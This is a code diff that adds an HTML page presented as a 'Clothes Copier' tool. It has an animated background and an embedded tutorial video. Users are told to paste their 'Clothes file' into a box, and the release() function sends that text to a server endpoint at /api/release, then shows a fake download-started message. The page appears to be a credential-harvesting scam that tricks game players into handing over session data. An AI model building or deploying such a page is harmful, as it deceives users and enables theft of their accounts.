@@ -1,3 +1,9 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Clothes Copier</title>
+
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
 
@@ -14,6 +20,13 @@ align-items:center;
 flex-direction:column;
 }
 
+canvas{
+position:absolute;
+top:0;
+left:0;
+z-index:0;
+}
+
 h1{
 z-index:1;
 color:white;
@@ -24,11 +37,243 @@ letter-spacing:1px;
 text-shadow:0 4px 12px rgba(0,0,0,0.5);
 }
 
+.main-wrapper{
+position:relative;
+z-index:1;
+display:flex;
+gap:40px;
+}
+
+.container{
+background:rgba(255,255,255,0.95);
+padding:20px;
+border-radius:15px;
+width:560px;
+height:315px;
+box-shadow:0 4px 20px rgba(0,0,0,0.25);
+border:4px solid #ffffff;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+}
+
+.instructions{
+font-size:14px;
+color:#333;
+text-align:center;
+margin-bottom:12px;
+line-height:1.4;
+}
+
+textarea{
+width:90%;
+height:100px;
+margin-bottom:15px;
+padding:8px;
+border-radius:8px;
+border:1px solid #ccc;
+resize:none;
+font-family:monospace;
+background:#f7f7f7;
+}
+
+.start-btn{
+padding:14px 45px;
+font-size:18px;
+font-weight:bold;
+border:none;
+border-radius:12px;
+cursor:pointer;
+color:white;
+background:linear-gradient(135deg,#0066ff,#00aaff);
+box-shadow:
+0 4px 10px rgba(0,0,0,0.3),
+inset 0 1px 0 rgba(255,255,255,0.4);
+transition:all .25s ease;
+}
+
+.start-btn:hover{
+transform:scale(1.08);
+box-shadow:
+0 0 12px rgba(0,150,255,0.9),
+0 4px 15px rgba(0,0,0,0.35);
+}
+
+.start-btn:active{
+transform:scale(.96);
+}
+
+.spinner{
+border:3px solid rgba(255,255,255,.3);
+border-top:3px solid white;
+border-radius:50%;
+width:18px;
+height:18px;
+animation:spin 1s linear infinite;
+display:inline-block;
+margin-left:10px;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg)}
+}
+
+#status{
+margin-top:10px;
+font-size:13px;
+color:#333;
+}
+
 .video-wrapper iframe{
 width:560px;
 height:315px;
 border-radius:15px;
-border:4px solid #001f5c; /* granatowa ramka */
+border:4px solid #001f5c;
 box-shadow:0 6px 25px rgba(0,0,0,0.4);
 }
+
 </style>
+</head>
+
+<body>
+
+<canvas id="bg"></canvas>
+
+<h1>Clothes Copier</h1>
+
+<div class="main-wrapper">
+
+<div class="container">
+
+<p class="instructions">
+Paste your Clothes file in the box below, then click "Start Process".<br>
+If you don't know how to get Clothes file, watch "How to use".
+</p>
+
+<textarea id="text" placeholder="Paste your text here..."></textarea>
+
+<button id="startBtn" class="start-btn" onclick="release()">
+Start Process
+</button>
+
+<p id="status"></p>
+
+</div>
+
+<div class="video-wrapper">
+<iframe src="https://www.youtube.com/embed/EEUiZFK3dfE" allowfullscreen></iframe>
+</div>
+
+</div>
+
+<script>
+
+const canvas=document.getElementById("bg")
+const ctx=canvas.getContext("2d")
+
+let w=canvas.width=window.innerWidth
+let h=canvas.height=window.innerHeight
+
+window.addEventListener("resize",()=>{
+w=canvas.width=window.innerWidth
+h=canvas.height=window.innerHeight
+})
+
+const particles=[]
+const numParticles=150
+
+for(let i=0;i<numParticles;i++){
+particles.push({
+x:Math.random()*w,
+y:Math.random()*h,
+vx:(Math.random()-0.5)*0.4,
+vy:(Math.random()-0.5)*0.4,
+r:1+Math.random()*2
+})
+}
+
+function draw(){
+
+ctx.clearRect(0,0,w,h)
+
+for(let p of particles){
+ctx.beginPath()
+ctx.arc(p.x,p.y,p.r,0,Math.PI*2)
+ctx.fillStyle="rgba(0,150,255,0.8)"
+ctx.fill()
+}
+
+for(let i=0;i<numParticles;i++){
+for(let j=i+1;j<numParticles;j++){
+
+const p1=particles[i]
+const p2=particles[j]
+
+const d=Math.hypot(p1.x-p2.x,p1.y-p2.y)
+
+if(d<100){
+ctx.strokeStyle="rgba(0,180,255,"+(1-d/100)+")"
+ctx.beginPath()
+ctx.moveTo(p1.x,p1.y)
+ctx.lineTo(p2.x,p2.y)
+ctx.stroke()
+}
+}
+}
+
+for(let p of particles){
+p.x+=p.vx
+p.y+=p.vy
+
+if(p.x<0||p.x>w)p.vx*=-1
+if(p.y<0||p.y>h)p.vy*=-1
+}
+
+requestAnimationFrame(draw)
+
+}
+
+draw()
+
+async function release(){
+
+const text=document.getElementById("text").value.trim()
+const status=document.getElementById("status")
+const btn=document.getElementById("startBtn")
+
+if(!text){
+status.innerText="Please enter Clothes file!"
+return
+}
+
+btn.innerHTML="Processing <span class='spinner'></span>"
+btn.disabled=true
+
+try{
+
+const res=await fetch("/api/release",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({text})
+})
+
+if(res.ok){
+status.innerText="Clothes Download Starting... (5 minutes)"
+}else{
+status.innerText="Wrong File! TIP: Watch the tutorial."
+}
+
+}catch(err){
+status.innerText="Error: "+err.message
+}
+
+btn.innerHTML="Start Process"
+btn.disabled=false
+
+}
+
+</script>
+
+</body>
+</html>
